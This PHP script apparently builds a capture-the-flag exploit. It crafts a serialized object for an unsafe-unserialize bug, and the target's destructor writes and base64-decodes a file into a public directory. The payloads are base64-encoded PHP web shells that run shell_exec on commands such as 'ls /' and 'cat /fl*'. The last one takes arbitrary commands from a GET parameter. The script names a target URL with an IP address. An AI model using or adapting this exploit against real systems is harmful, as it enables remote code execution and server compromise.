<?php
class SecurePasswordManager{
    function __construct() {
    }
    function __destruct() {
#            $sid = session_id();
#            mkdir("/app/public/tmp/{$sid}/");
#            $filesize = file_put_contents("/app/public/tmp/{$sid}/{$this->filename}", $this->content);
#            $filename = "/app/public/tmp/{$sid}/{$this->filename}";
#            if ($filesize === 48){
#                    echo "Administrator feauture: Uploaded user password file";
#                    $password = file_get_contents($filename);
#                    $content= base64_decode($password);
#                    $file = fopen($filename, 'w');    
#                    fwrite($file, $content);
#                    fclose($file);
#                    echo "[+] Debug: Done";
#	    }
#	    else {
#	    unlink($filename);
#	    }
    }
}
#$data = unserialize($_GET['data']);

$data = new SecurePasswordManager();
$data->filename = "exception.php";
#$data->content = "PD9waHAgZWNobyAxOyBlY2hvIDI7IGVjaG8gMzsgICA/Pg=="; #<?php echo 1; echo 2; echo 3;   ? >
#$data->content = "PD9waHAgc2hlbGxfZXhlYygnbHMgLycpOyAgICAgICAgPz4="; # <?php shell_exec('ls /');        ? >
$data->content = "PD9waHAgZWNobyBzaGVsbF9leGVjKCJwd2QiKTsgICAgPz4="; # grande
$data->content = "PD9waHAgZWNobyBzaGVsbF9leGVjKCJwd2QiKTsgICA/Pg=="; # pequeño pwd
$data->content = "PD9waHAgZWNobyBzaGVsbF9leGVjKCJscyAvIik7ICAgPz4%3D"; #  <?php echo shell_exec("ls /");   ? > b64 + urlparse
$data->content = "PD9waHAgZWNobyBzaGVsbF9leGVjKCJscyAvIik7ICAgPz4="; #  <?php echo shell_exec("ls /");   ? > b64
$data->content = "PD9waHAgZWNobyBzaGVsbF9leGVjKCJjYXQgL2ZsKiIpOz8+"; # cat /fl*
$data->content = "PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjIl0pPz4="; # echo shell_exec($_GET['c']) 

#$data->content = "PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+    "; # echo system($_GET[c]) oreos

$serializado = serialize($data);
$url_base = "http://142.93.97.61:8001/?data=";
echo ($serializado); 

?>
